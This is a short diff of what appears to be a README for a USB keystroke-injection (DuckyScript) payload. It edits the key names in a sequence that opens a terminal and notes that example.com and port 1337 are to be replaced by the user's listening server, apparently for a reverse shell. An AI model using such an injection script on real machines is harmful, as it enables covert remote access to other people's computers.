@@ -2,11 +2,11 @@ Change `example.com` to your listening server address and `1337` to your own por
 
 ```
 DELAY 2000
-GUI space
+GUI SPACE
 DELAY 500
 ALT F2
 DELAY 500
-BACKSPACE
+DEL
 DELAY 100
 STRING terminal
 ENTER
